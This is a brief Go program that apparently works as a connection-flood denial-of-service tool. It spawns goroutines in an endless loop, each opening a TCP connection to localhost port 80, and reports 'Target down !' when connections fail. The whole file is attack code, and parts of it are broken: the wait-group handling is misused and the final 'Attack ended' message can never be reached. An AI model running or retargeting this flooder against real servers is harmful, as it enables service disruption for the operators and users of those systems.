package main

import (
	"fmt"
	"log"
	"net"
	"sync"
)

func main() {

	var wg sync.WaitGroup

	for {
		wg.Add(1)
		go func() {
			wg.Done()
			_, err := net.Dial("tcp", "localhost:80")
			if err != nil {
				log.Fatalln("Target down !")
			}
		}()
	}
	wg.Wait()

	fmt.Print("\n\n! Attack ended !")

}
